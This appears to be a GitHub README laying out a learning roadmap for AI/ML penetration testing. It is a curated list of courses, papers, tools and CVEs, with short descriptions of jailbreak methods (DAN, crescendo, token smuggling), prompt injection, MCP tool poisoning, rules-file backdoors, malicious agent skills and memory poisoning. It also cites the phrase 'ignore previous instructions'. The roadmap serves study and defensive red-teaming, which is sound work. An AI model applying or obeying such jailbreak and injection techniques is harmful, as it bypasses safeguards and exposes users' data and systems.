# 🛡️ AI/ML Pentesting Roadmap (2026 Edition)

![output](https://github.com/user-attachments/assets/ca866203-8e57-4063-9d63-4ac919ed7b07)

> A comprehensive, structured guide to learning AI/ML security and penetration testing — from zero to practitioner. Updated with the latest tools, research, attack surfaces (including MCP/agentic AI, RAG, AI coding assistants, agent skills, and computer-use agents), and community resources.

**Legend used throughout this roadmap:**
`Foundational` — still the best way to learn the concept · `Historical` — kept for context, superseded in practice · `Archived` — project no longer maintained but still readable · `Legacy` — older version retained alongside its successor · `Unverified` — community-submitted, not independently validated by maintainers

---

## 📋 Table of Contents

1. [Prerequisites](#prerequisites)
2. [Phase 1 — Foundations](#phase-1--foundations)
3. [Phase 2 — AI/ML Security Concepts](#phase-2--aiml-security-concepts)
4. [Phase 3 — Prompt Injection & LLM Attacks](#phase-3--prompt-injection--llm-attacks)
5. [Phase 4 — Agentic AI, MCP & Agent Ecosystem Security](#phase-4--agentic-ai-mcp--agent-ecosystem-security)
6. [Phase 5 — RAG, Vector & Embedding Security](#phase-5--rag-vector--embedding-security)
7. [Phase 6 — Hands-On Practice](#phase-6--hands-on-practice)
8. [Phase 7 — Advanced Exploitation Techniques](#phase-7--advanced-exploitation-techniques)
9. [Phase 8 — Real-World Research & Bug Bounty](#phase-8--real-world-research--bug-bounty)
10. [Standards, Frameworks & References](#standards-frameworks--references)
11. [Tools & Repositories](#tools--repositories)
12. [Benchmarks & Datasets](#benchmarks--datasets)
13. [Books, PDFs & E-Books](#books-pdfs--e-books)
14. [Video Resources & Podcasts](#video-resources--podcasts)
15. [CTF & Competitions](#ctf--competitions)
16. [Bug Bounty Programs](#bug-bounty-programs)
17. [Community & News](#community--news)
18. [Key Academic Papers](#key-academic-papers)
19. [Suggested Learning Path by Experience Level](#suggested-learning-path-by-experience-level)
20. [What's New in This Edition](#whats-new-in-this-edition)

---

## Prerequisites

Before diving into AI/ML pentesting, ensure you have the following foundation:

### General Security Basics
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free, hands-on web security training (XSS, SQLi, SSRF, etc.)
- [TryHackMe — Pre-Security Path](https://tryhackme.com/path/outline/presecurity)
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10](https://owasp.org/API-Security/) — Most LLM app bugs are still API bugs underneath

> **Why web security first:** a large share of paid AI bug bounty findings are classic AuthZ, IDOR, SSRF, and cache-deception bugs reached *through* an AI feature. The model is often just a new entry vector to the same old bug classes.

### Programming (Python is essential)
- [Python for Everybody — Coursera](https://www.coursera.org/specializations/python)
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/) — Free online book
- [CS50P — Python](https://cs50.harvard.edu/python/) — Free Harvard course

### APIs & HTTP
- Understand REST APIs, HTTP methods, headers, and authentication flows
- [Postman Learning Center](https://learning.postman.com/)
- Practice with tools: `curl`, `Burp Suite`, `Postman`
- Understand OAuth 2.0 / OAuth 2.1 and JWT — required for MCP authorization work

### Autonomous / AI-Assisted Pentest Platforms
- [Darkmoon](https://github.com/ASCIT31/Dark-Moon) — Open source (GPL-3.0) autonomous AI penetration testing platform covering web, API, Active Directory and Kubernetes, with proof of exploitation and a local privacy gateway. `Unverified`

---

## Phase 1 — Foundations

### 1.1 Machine Learning Fundamentals

| Resource | Type | Cost |
|---|---|---|
| [Machine Learning — Andrew Ng (Coursera)](https://www.coursera.org/learn/machine-learning) | Course | Audit Free · `Foundational` |
| [Machine Learning Specialization (current successor)](https://www.coursera.org/specializations/machine-learning-introduction) | Course | Audit Free |
| [Introduction to ML — edX](https://www.edx.org/course/introduction-to-machine-learning) | Course | Audit Free |
| [fast.ai Practical Deep Learning](https://course.fast.ai/) | Course | Free |
| [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course) | Course | Free |
| [Kaggle ML Courses](https://www.kaggle.com/learn) | Course | Free |
| [3Blue1Brown — Neural Networks](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) | Video | Free |

### 1.2 Large Language Models (LLMs)

Understanding how LLMs work is critical before attacking them.

| Resource | Type | Cost |
|---|---|---|
| [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g) | Video | Free |
| [Andrej Karpathy — Let's build GPT](https://www.youtube.com/watch?v=kCc8FmEb1nY) | Video | Free |
| [Andrej Karpathy — Let's build the GPT Tokenizer](https://www.youtube.com/watch?v=zduSFxRajkE) | Video | Free — tokenization underpins token smuggling, homoglyph and Unicode attacks |
| [Hugging Face NLP Course](https://huggingface.co/learn/nlp-course) | Course | Free |
| [Hugging Face Agents Course](https://huggingface.co/learn/agents-course) | Course | Free — tool calling and agent loops from first principles |
| [LLM University by Cohere](https://llmu.cohere.com/) | Course | Free |
| [Prompt Engineering Guide](https://www.promptingguide.ai/) | Guide | Free |
| [The Illustrated Transformer — Jay Alammar](https://jalammar.github.io/illustrated-transformer/) | Article | Free · `Foundational` |
| [Attention Is All You Need (original transformer paper)](https://arxiv.org/abs/1706.03762) | Paper | Free · `Foundational` |

### 1.3 Model Internals That Matter for Attackers

You do not need to train models, but you do need to know where the seams are.

- **Tokenization** — byte-pair encoding explains why invisible characters, homoglyphs and control characters slip past filters
- **Context window & attention** — why "ignore previous instructions" works at all: there is no privilege boundary between system, user, and retrieved text inside the token stream
- **Embeddings** — why vector stores leak (see [Phase 5](#phase-5--rag-vector--embedding-security))
- **Inference & sampling** — temperature, top-p, and why attack reproducibility is probabilistic
- **Fine-tuning, RLHF/RLAIF & alignment** — where safety training lives, and why it is shallow relative to capability
- [Anthropic — Constitutional AI](https://www.anthropic.com/research/constitutional-ai-harmlessness-from-ai-feedback) — how RLAIF-style alignment is actually built
- [Hugging Face — RLHF illustrated](https://huggingface.co/blog/rlhf)

---

## Phase 2 — AI/ML Security Concepts

### 2.1 Core Security Concepts

- [OWASP GenAI LLM Top 10 — 2026 edition](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) — **Current release, published 4 August 2026.** The 2026 ranking: LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM03 Excessive Agency (up three places), LLM04 Supply Chain, LLM05 Data & Model Poisoning, LLM06 Unbounded Consumption, LLM07 Misinformation, LLM08 Hidden Context Exposure (replaces the narrower System Prompt Leakage category), LLM09 Vector & Embedding Weaknesses, LLM10 Improper Output Handling
- [OWASP GenAI LLM Top 10 — canonical GitHub source](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10) — Errata form, Zenodo archive, and the machine-readable citation file
- [OWASP LLM Top 10 (2025)](https://genai.owasp.org/llm-top-10/) — `Legacy` but still widely referenced; most tooling and CTFs published in 2025–early 2026 map to this version, so keep it for cross-referencing
- [OWASP Top 10 for LLM Applications v1.1 (2023)](https://owasp.github.io/www-project-top-10-for-large-language-model-applications/) — `Historical` archive of the original list
- [OWASP Top 10 for Agentic Applications 2026 (ASI01–ASI10)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) — Announced December 2025. Covers planning, tool use, identity, supply chain, code execution, memory, inter-agent communication, cascading failures, human–agent trust, and rogue agents
- [OWASP GenAI Security Project — Agent Control Standard & 2026 announcements](https://genai.owasp.org/2026/09/01/owasp-genai-security-project-unveils-2026-top-10-for-llm-applications-new-agent-control-standard-and-sponsors-as-community-tops-30000-members/) — September 2026: ACS donation, expanded AI security solutions guidance
- [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/) — MCP01 Token Mismanagement, MCP02 Privilege Escalation via Scope Creep, MCP03 Tool Poisoning, MCP04 Supply Chain & Dependency Tampering, MCP05 Command Injection, MCP06 Intent Flow Subversion, MCP07 Insufficient AuthN/AuthZ, MCP08 Lack of Audit & Telemetry, MCP09 Shadow MCP Servers, MCP10 Context Injection & Over-Sharing
- [OWASP GenAI Red Teaming Guide & Red Team Initiative](https://genai.owasp.org/) — Practical red teaming methodology; browse the project Resources index for the current PDF
- [OWASP GenAI Red Team Lab (GitHub)](https://github.com/GenAI-Security-Project/GenAI-Red-Team-Lab) — Companion repo to the Red Teaming Handbook: local LLM and RAG sandboxes plus garak/promptfoo exploitation examples
- [MITRE ATLAS Matrix](https://atlas.mitre.org/matrices/ATLAS/) — The AI adversarial threat matrix. v5.1.0 (November 2025) expanded to 16 tactics and 84 techniques; 2026 releases added agentic AI techniques. Prompt injection is `AML.T0051`
- [MITRE ATLAS Case Studies](https://atlas.mitre.org/studies/) — Real incidents mapped to the matrix; the best source of grounded threat models
- [NIST AI 100-2e2025 — Adversarial Machine Learning: A Taxonomy and Terminology of Attacks and Mitigations](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-2e2025.pdf) — The canonical taxonomy (PredAI vs GenAI, evasion/poisoning/privacy/abuse). Published March 2025, supersedes AI 100-2e2023
- [NIST AI Risk Management Framework](https://airc.nist.gov/Home) — Federal AI risk guidance
- [IBM — AI Security Overview](https://www.ibm.com/topics/ai-security)
- [AI Village — LLM Threat Modeling](https://aivillage.org/large%20language%20models/threat-modeling-llm/)
- [HackerOne — Ultimate Guide to Managing Ethical and Security Risks in AI](https://www.hackerone.com/resources/e-book/the-ultimate-guide-to-managing-ethical-and-security-risks-in-ai)
- [Adversa AI 2025 Security Report](https://adversa.ai/blog/adversa-ai-unveils-explosive-2025-ai-security-incidents-report-revealing-how-generative-and-agentic-ai-are-already-under-attack/) — 35% of real-world AI incidents caused by simple prompts

### 2.2 Attack Surface Overview

Key attack vectors in AI/ML systems:

- **Prompt Injection** — Manipulating LLM behavior through crafted inputs
- **Indirect Prompt Injection (IPI)** — Attacks via documents, web content, emails, RAG pipelines
- **Jailbreaking** — Bypassing safety filters and guardrails
- **Multi-Turn Attacks** — Attacks unfolding across extended conversations (92% success rate reported in 2025 research)
- **Tool Poisoning** — Injecting malicious instructions into MCP tool metadata/descriptions
- **Model Inversion** — Extracting training data from a model
- **Membership Inference** — Determining if data was in training set
- **Data Poisoning** — Corrupting training data to influence behavior
- **Adversarial Examples** — Perturbed inputs that fool classifiers
- **Model Extraction/Stealing** — Cloning a model via API queries
- **Supply Chain Attacks** — Malicious models/weights on platforms like Hugging Face
- **MCP Server Exploitation** — Tool poisoning, resource theft, conversation hijacking via MCP
- **AI IDE Attacks** — Exploiting Cursor, GitHub Copilot, Claude Code via rules files and MCP config
- **RAG Poisoning** — Injecting malicious content into retrieval-augmented generation pipelines
- **Training Data Exfiltration** — Extracting memorized private data
- **Denial of Service** — Overloading models via crafted prompts
- **Agent-to-Agent Attacks** — Compromising multi-agent pipelines (A2A protocol abuse)
- **Agent Skill / Plugin Poisoning** — Malicious instructions in `SKILL.md`, plugin manifests and marketplace packages
- **Memory Poisoning & Persistence** — Writing attacker instructions into long-term agent memory so they survive the session
- **Hidden Context Exposure** — Leaking retrieved documents, memory, tool responses and application state, not just the literal system prompt (OWASP LLM08:2026)
- **Embedding Inversion & Cross-Tenant Retrieval** — Reconstructing source text from vectors; retrieving another tenant's chunks
- **Visual / Multimodal Prompt Injection** — Instructions hidden in images, screenshots, OCR text, audio, PDFs
- **Confused Deputy & Excessive Agency** — Agent uses its own high privileges on behalf of a low-privileged attacker
- **Shadow MCP / Shadow Agents** — Unapproved, unmanaged agent infrastructure inside the enterprise

### 2.3 MLOps & Infrastructure Security

- [From MLOps to MLOops — JFrog](https://jfrog.com/blog/from-mlops-to-mloops-exposing-the-attack-surface-of-machine-learning-platforms/)
- [Offensive ML Playbook](https://wiki.offsecml.com/Welcome+to+the+Offensive+ML+Playbook)
- [AI Exploits — ProtectAI](https://github.com/protectai/ai-exploits)
- [Awesome AI Security — ottosulin](https://github.com/ottosulin/awesome-ai-security)
- [Shelltorch — TorchServe vulnerabilities (CVSS 9.9)](https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server) — Still the reference case study for exposed inference servers
- [Cisco — Detecting Exposed LLM Servers: A Shodan Case Study on Ollama](https://blogs.cisco.com/security/detecting-exposed-llm-servers-shodan-case-study-on-ollama) — Unauthenticated local-inference servers exposed to the internet
- **Inference-server attack surface worth enumerating:** vLLM, Ollama, llama.cpp / `llama-server`, TensorRT-LLM, Triton Inference Server, TorchServe, Ray, and Kubernetes GPU workloads. Default configurations frequently ship with no authentication

---

## Phase 3 — Prompt Injection & LLM Attacks

### 3.1 Understanding Prompt Injection

- [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) — Canonical definition updated for agentic systems; the baseline every 2025–26 tool cites. Still LLM01 in the 2026 edition
- [IBM Guide on Prompt Injection](https://www.ibm.com/topics/prompt-injection)
- [Simon Willison's Explanation of Prompt Injection](https://simonwillison.net/2023/May/2/prompt-injection-explained/) — `Foundational`
- [Simon Willison — prompt injection tag (running archive)](https://simonwillison.net/tags/prompt-injection/) — The single best continuously updated index of injection incidents
- [Prompt Injection in 2026: Why the Attack Surface Keeps Growing](https://notchrisgroves.com/prompt-injection-2026-attack-surface/) — Explains why the problem is structural, not fixable by filters, and covers the Morris II AI worm. `Unverified`
- [Learn Prompting — Prompt Hacking and Injection](https://learnprompting.org/docs/prompt_hacking/injection)
- [PortSwigger LLM Attacks](https://portswigger.net/web-security/llm-attacks)
- [NCC Group — Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/) — `Foundational`
- [Bugcrowd — AI Vulnerability Deep Dive: Prompt Injection](https://www.bugcrowd.com/blog/ai-vulnerability-deep-dive-prompt-injection/)
- [Prompt Injection Cheat Sheet — Seclify](https://blog.seclify.com/prompt-injection-cheat-sheet/) — Practical cheat sheet for AI bot integrations
- [Don't You (Forget NLP) — Dropbox Tech](https://dropbox.tech/machine-learning/prompt-injection-with-control-characters-openai-chatgpt-llm) — Injection via control characters
- [hego.red — Practical AI/LLM Red Teaming Notes](https://hego.red/) — Hands-on guide: prompt injection, jailbreaks, indirect injection, RAG poisoning, agent and tool attacks, with a full methodology and worked labs. `Unverified`

### 3.2 Jailbreaking Techniques

- **DAN (Do Anything Now)** — Classic jailbreak technique: [Chatgpt-DAN Repo](https://github.com/alexisvalentino/Chatgpt-DAN) · `Historical`
- **Role-playing / Persona manipulation**
- **Token smuggling** — Encoding instructions to bypass filters
- **Prompt leaking** — Extracting system prompts
- **Indirect prompt injection** — Attacks via documents, web content, memory
- **Multi-turn jailbreaks** — Steering models over successive conversation turns (>90% bypass rate against most published defenses)
- **Crescendo / gradual escalation** — Benign opening turns that incrementally relocate the conversation past the refusal boundary
- **Low-resource language and encoding transfer** — Safety training generalizes unevenly across languages, base64, ROT13 and leetspeak
- [WideOpenAI — Jailbreak Collection](https://github.com/WibblyOWobbly/WideOpenAI)
- [PayloadsAllTheThings — Prompt Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/)
- [PALLMs — Payloads for Attacking LLMs](https://github.com/mik0w/pallms/)
- [L1B3RT4S — jailbreak prompt collection](https://github.com/elder-plinius/L1B3RT4S) — Large, actively updated public jailbreak corpus, useful as a regression-test set

### 3.3 Indirect Prompt Injection

A sophisticated attack where malicious instructions are injected via external data sources (emails, documents, websites, RAG chunks) that an LLM agent processes.

- [Greshake — LLM Security / Not What You've Signed Up For](https://github.com/greshake/llm-security) — `Foundational`, the original IPI proof-of-concept collection
- [Embrace The Red — Blog](https://embracethered.com/blog/) — Leading blog covering real-world indirect injection
- [GitHub Copilot Chat: Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)
- [Google AI Studio Data Exfiltration](https://embracethered.com/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/)
- [Indirect Prompt Injection Through MCP Tools: A Defense Guide](https://www.stackone.com/blog/indirect-prompt-injection-mcp-tools-defense) — Feb 2026, covers every MCP tool category
- [CrowdStrike — Indirect Prompt Injection Attacks: Hidden AI Risks](https://www.crowdstrike.com/en-us/blog/indirect-prompt-injection-attacks-hidden-ai-risks/) — Dec 2025, enterprise IPI TTPs and SOC detection signals
- [Lakera — Indirect Prompt Injection: The Hidden Threat](https://www.lakera.ai/blog/indirect-prompt-injection) — Zero-click RCE in MCP-based AI IDEs case study

### 3.4 Advanced Prompt Attack Techniques

- [How to Persuade an LLM to Change Its System Prompt](https://medium.com/@KonradDaWo/how-to-persuade-a-llm-to-change-its-system-prompt-to-aid-in-ctf-challenges-e74c1d570ed3)
- [Design Patterns for Securing LLM Agents Against Prompt Injection](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/) — Jun 2025
- [OpenAI — Hardening Atlas Against Prompt Injection Attacks](https://openai.com/index/hardening-atlas-against-prompt-injection/) — Dec 2025 real attack chain disclosure + RL-trained automated attacker; states plainly that prompt injection is unlikely ever to be fully solved
- [Improving LLM Security Against Prompt Injection: AppSec Guidance](https://blog.includesecurity.com/2024/01/improving-llm-security-against-prompt-injection-appsec-guidance-for-pentesters-and-developers/) — Role-based APIs and 13 system prompt guidelines
- [Bugcrowd Ultimate Guide to AI Security (PDF)](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf)
- [Snyk OWASP Top 10 LLM (PDF)](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf) — `Legacy` (2025 list)
- [Vanna.AI Prompt Injection RCE — JFrog](https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/)

### 3.5 Defenses Worth Understanding (and Breaking)

You cannot assess a defense you do not understand. Every item below has published bypasses — study both halves.

- [CaMeL — Defeating Prompt Injections by Design (arXiv 2503.18813)](https://arxiv.org/abs/2503.18813) — Google DeepMind; control/data-flow separation rather than detection. The most architecturally serious defense published so far
- [Microsoft FIDES — Information-Flow Control Against IPI in Copilot](https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks) — Jul 2025 privilege separation system
- [Meta — Agents Rule of Two (Practical AI Agent Security)](https://ai.meta.com/blog/practical-ai-agent-security/) — Bound the blast radius architecturally (see [4.5](#45-metas-agents-rule-of-two-framework))
- [PromptArmor (arXiv 2507.15219)](https://arxiv.org/abs/2507.15219) — Simple detection baseline reporting sub-1% FP/FN on AgentDojo
- [A Critical Evaluation of Defenses against Prompt Injection Attacks (arXiv 2505.18333)](https://arxiv.org/abs/2505.18333) — Why most reported defense numbers do not survive adaptive attackers
- [The Attacker Moves Second (arXiv 2510.09023)](https://arxiv.org/abs/2510.09023) — Adaptive attacks bypass 12 published defenses at >90%
- [tldrsec/prompt-injection-defenses](https://github.com/tldrsec/prompt-injection-defenses) — Actively maintained catalog of every practical defense in production

---

## Phase 4 — Agentic AI, MCP & Agent Ecosystem Security

This is the **fastest-growing and most dangerous attack surface** as of 2025–2026. When LLMs are given tools, memory, and autonomous action capabilities, the blast radius of any injection expands dramatically.

### 4.1 Why Agentic AI Changes Everything

Agentic AI systems operate in observe-orient-decide-act loops. They can browse the web, read/write files, execute code, call APIs, and communicate with other agents. A single successful injection can lead to:
- Remote Code Execution (RCE)
- Data exfiltration from private repositories
- Unauthorized financial transactions
- Lateral movement across multi-agent pipelines

Key reading:
- [OWASP Top 10 for Agentic Applications 2026 (ASI01–ASI10)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) — **Start here.** Announced Dec 2025, peer-reviewed by 100+ contributors
- [OWASP — Why the Agentic Top 10 exists](https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agentic-security-in-the-age-of-autonomous-ai/) — Project leads on the LLM-vs-agentic distinction
- [Anthropic — Disrupting the first reported AI-orchestrated cyber espionage campaign](https://www.anthropic.com/news/disrupting-AI-espionage) — GTG-1002: state-linked actors weaponized an agentic coding tool with malicious MCP servers; reported 80–90% of tactical operations executed autonomously. The most significant real-world agentic-abuse disclosure to date
- [AI Agent Attacks in Q4 2025 Signal New Risks for 2026 — eSecurity Planet](https://www.esecurityplanet.com/artificial-intelligence/ai-agent-attacks-in-q4-2025-signal-new-risks-for-2026/)
- [Enterprises Are Racing to Secure Agentic AI Deployments — Help Net Security](https://www.helpnetsecurity.com/2026/02/23/ai-agent-security-risks-enterprise/) — Multi-turn attacks achieved 92% success against 8 open-weight models
- [Adversa AI 2025 AI Security Incidents Report](https://adversa.ai/blog/adversa-ai-unveils-explosive-2025-ai-security-incidents-report-revealing-how-generative-and-agentic-ai-are-already-under-attack/)

### 4.2 Model Context Protocol (MCP) Security

MCP (introduced by Anthropic in late 2024) is the de facto standard for connecting LLMs to external tools — and is the dominant new attack surface.

**MCP-specific attack classes:**
- **Tool Poisoning** — Embedding malicious instructions in tool `description` fields that agents trust implicitly
- **Tool Shadowing** — Registering a malicious tool with a name/description that intercepts calls meant for a legitimate tool
- **Rug Pull** — A server that serves a benign tool definition at install time and mutates it later
- **Resource Theft** — Abusing MCP sampling to drain compute quotas
- **Conversation Hijacking** — Compromised MCP servers inject persistent instructions
- **Covert Tool Invocation** — Hidden file system operations without user awareness
- **Cross-MCP Contamination** — One MCP server overrides another's behavior
- **Token Passthrough / Confused Deputy** — Servers accepting tokens not issued for them; missing audience binding
- **Shadow MCP** — Unapproved servers running inside the org with no inventory or audit trail
- **STDIO credential harvesting** — Local servers inheriting the full environment, including every secret in it

**Standards and primary guidance:**
- [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/) — The reference taxonomy (MCP01–MCP10). Supersedes the placeholder "OWASP MCP CheatSheet" link carried in earlier editions of this roadmap
- [Model Context Protocol — official specification](https://modelcontextprotocol.io/) — Read the security best practices and authorization sections of the current spec revision; authorization is **optional**, which is the root of much of MCP01/MCP07
- [Microsoft — OWASP MCP Top 10 Security Guidance for Azure](https://microsoft.github.io/mcp-azure-security-guide/) — Maps each MCP risk to concrete platform controls; useful even if you are not on Azure
- [CSA — Agentic MCP Security Best Practices](https://labs.cloudsecurityalliance.org/agentic/agentic-mcp-security-best-practices-v1/) — 2026 consolidation of the tool-poisoning, rug-pull and cross-server literature

**Attack research:**
- [Invariant Labs — mcp-injection-experiments](https://github.com/invariantlabs-ai/mcp-injection-experiments) — Reproducible PoCs for direct poisoning, tool shadowing, and the WhatsApp sleeper rug pull. The canonical hands-on starting point
- [Palo Alto Unit 42 — New Prompt Injection Attack Vectors Through MCP Sampling](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) — Dec 2025, three critical attack vectors
- [Checkmarx — 11 Emerging AI Security Risks with MCP](https://checkmarx.com/zero-post/11-emerging-ai-security-risks-with-mcp-model-context-protocol/) — Nov 2025
- [MCP Prompt Injection: How AI Gets Hacked (YouTube)](https://www.youtube.com/watch?v=bO-7DB-3dL8) — Nov 2025 hands-on walkthrough
- [ToxicSkills: Snyk Finds Malware in 36% of AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) — Feb 2026; 3,984 skills audited, 36.82% flawed, 13.4% critical, confirmed malicious payloads

**Notable MCP CVEs and incidents to study:**
- **CVE-2025-6514** — `mcp-remote` proxy RCE (CVSS 9.6), 437,000+ affected installs
- **CVE-2025-53109 / CVE-2025-53110** — "EscapeRoute" filesystem MCP sandbox bypass
- **Anthropic Git MCP server** — argument-injection class issues allowing backdoors via processed repositories
- **Supabase/Cursor support-ticket chain (June 2025)** — SQL executed and exfiltrated via a poisoned support ticket
- **Asana MCP cross-tenant exposure (2025)** — Multi-tenant isolation failure in a production MCP integration

### 4.3 AI IDE & Coding Assistant Security

AI coding assistants (Claude Code, GitHub Copilot, Cursor, Windsurf, Cline, Roo Code, Codex-class tools) have system-level access and are a high-value target. Assume every file in a cloned repository is attacker-controlled input.

- **Rules File Backdoor** — `.cursor/rules`, `CLAUDE.md`, `AGENTS.md`, `.github/copilot-instructions.md` and similar context files can be poisoned with malicious instructions
- **Settings/hook execution** — Repository-controlled configuration that runs commands at project-open time, before any user interaction
- **MCP config injection** — Malicious `mcp.json` entries added to a repo
- **CVE-2025-53773** — GitHub Copilot RCE (CVSS 9.6) via prompt injection
- **CVE-2025-54135** — Cursor indirect prompt injection via MCP config → RCE
- **CVE-2025-59536** — Claude Code hook-triggered RCE (CVSS 8.7), patched Oct 2025
- **CVE-2026-21852** — Claude Code API key exfiltration (CVSS 5.3), patched Jan 2026
- **IDEsaster** — 30+ CVEs in AI IDEs: [The Hacker News coverage](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html)

Resources:
- [Rules File Backdoor — Cursor/Copilot](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor)
- [GitGuardian — Can GitHub Copilot Leak Secrets?](https://blog.gitguardian.com/yes-github-copilot-can-leak-secrets/)
- [Your AI, My Shell (arXiv 2509.22040)](https://arxiv.org/abs/2509.22040) — AIShellJack; systematic analysis of prompt injection in agentic coding editors, ~84% ASR for shell injection on Copilot/Cursor
- [Prompt Injection Attacks on Agentic Coding Assistants (SoK, arXiv 2601.17548)](https://arxiv.org/html/2601.17548v1) — Meta-analysis of 78 studies; >85% attack success against state-of-the-art defenses. `Unverified` ID — confirm before citing in formal work

### 4.4 Agent Skills, Plugins & Extension Supply Chain

The `SKILL.md` file is the new `package.json`, and it currently ships with no signing, no sandbox by default, and a publishing bar of roughly "a Markdown file and a week-old GitHub account." This is the fastest-moving supply-chain story of 2026.

- [Snyk — ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/) — Feb 2026, first large-scale audit (3,984 skills)
- [HiddenLayer — The Next AI Supply Chain Risk: Malicious Skills in Agentic AI](https://www.hiddenlayer.com/research/the-next-ai-supply-chain-risk-malicious-skills-in-agentic-ai) — Jun 2026; why the pattern transfers from consumer agents to Claude Code, Cursor and Copilot
- [Cato CTRL — Weaponizing Claude Skills with MedusaLocker](https://www.catonetworks.com/blog/cato-ctrl-weaponizing-claude-skills-with-medusalocker/) — Ransomware delivery via a legitimate-looking skill; consent-gap analysis
- [CSA — SKILL.md and Agent Context Poisoning](https://labs.cloudsecurityalliance.org/research/briefing-csa-research-note-skill-md-agent-context-poisoning/) — Executive briefing tying the CVEs and audits together
- [Agent Skills in the Wild (arXiv 2601.10338)](https://arxiv.org/abs/2601.10338) — Large-scale empirical security study of the skill ecosystem
- [Malicious Agent Skills in the Wild (arXiv 2602.06547)](https://arxiv.org/abs/2602.06547) — "Do Not Mention This to the User": detection and taxonomy of in-the-wild malicious skills
- [Cisco AI Defense — skill-scanner](https://github.com/cisco-ai-defense/skill-scanner) — Static analyzer for agent skills
- **CVE-2026-25253** — RCE in an agent skill runtime; reported as the first CVE assigned to an agentic AI system
- **ClawHavoc campaign (2026)** — Coordinated publication of malicious skills to a public marketplace, delivering a credential stealer

### 4.5 Meta's "Agents Rule of Two" Framework

Meta's Oct 2025 architectural approach: agents must satisfy **no more than two** of:
- (A) Processing untrustworthy inputs
- (B) Access to sensitive data
- (C) Ability to change state externally

This provides a deterministic way to bound blast radius. Read: [Meta — Practical AI Agent Security](https://ai.meta.com/blog/practical-ai-agent-security/)

Use it as a triage heuristic on engagements: find the agent that satisfies all three, and you have found where to spend your time.

### 4.6 Computer-Use & Browser Agent Security

Agentic browsers and GUI agents inherit the user's authenticated sessions and cookies, which turns any injected instruction into a cross-origin data-access primitive.

- [UW study — Some agentic AI browsers come with major cybersecurity risks](https://www.washington.edu/news/2026/06/30/some-agentic-ai-browsers-come-with-major-cybersecurity-risks-uw-study-finds/) — Jun 2026; PoC cross-site data theft, with the finding that agents granted fewer permissions were measurably safer
- [OpenAI — Hardening Atlas Against Prompt Injection](https://openai.com/index/hardening-atlas-against-prompt-injection/) — Vendor-side account of a real attack chain plus lockdown-mode tradeoffs
- [Brave — research on agentic browser vulnerabilities](https://brave.com/blog/) — Originated the Comet screenshot/OCR injection disclosure and subsequent hidden-HTML work on other agentic browsers
- [CSA — PleaseFix: Zero-Click Browser Agent Hijacking](https://labs.cloudsecurityalliance.org/wp-content/uploads/2026/03/CSA_research_note_PleaseFix_agentic_browser_exploits_20260328-csa-styled.pdf) — Mar 2026; consolidates ZombieAgent, GeminiJack, Tainted Memories, HashJack and CometJacking into one attack class
- [VPI-Bench: Visual Prompt Injection for Computer-Use Agents (arXiv 2506.02456)](https://arxiv.org/abs/2506.02456)
- [WASP: Benchmarking Web Agent Security Against Prompt Injection (arXiv 2504.18575)](https://arxiv.org/abs/2504.18575) — Meta
- [WAInjectBench (arXiv 2510.01354)](https://arxiv.org/abs/2510.01354) — Benchmarking prompt-injection *detection* for web agents
- [CaMeLs Can Use Computers Too (arXiv 2601.09923)](https://arxiv.org/abs/2601.09923) — System-level security for computer-use agents
- [atlas-prompt-injection-poc](https://github.com/brennanbrown/atlas-prompt-injection-poc) — Minimal reproducible PoC page for testing agentic browsers safely

### 4.7 Multimodal Attack Surface

- Image-embedded instructions (low-contrast text, steganographic and typographic prompts)
- OCR-channel injection — the agent reads what the user cannot see
- [FigStep: Jailbreaking Large Vision-Language Models via Typographic Visual Prompts](https://arxiv.org/abs/2311.05608)
- [Con Instruction: Universal Jailbreaking of Multimodal LLMs via Non-Textual Modalities (ACL 2025)](https://aclanthology.org/2025.acl-long.146/)
- Document-channel injection — PDFs, DOCX, spreadsheets and calendar invites parsed into context. The January 2026 Gemini calendar-invite exploit is the cleanest public example of a semantically benign payload
- Audio and video channels — transcription pipelines are an unfiltered instruction path

### 4.8 Multi-Agent, A2A & Memory Attacks

- **PoisonedRAG** (USENIX Security 2025) — Knowledge corruption attack injecting poisoned texts into RAG databases
- **A2A Protocol Abuse** — Google's Agent2Agent protocol creates new inter-agent attack surfaces
- **Log-To-Leak** — Covert privacy attacks via side channels in agent logs
- **MINJA / memory poisoning** — Writing adversarial entries into an agent's long-term memory store so the injection outlives the session
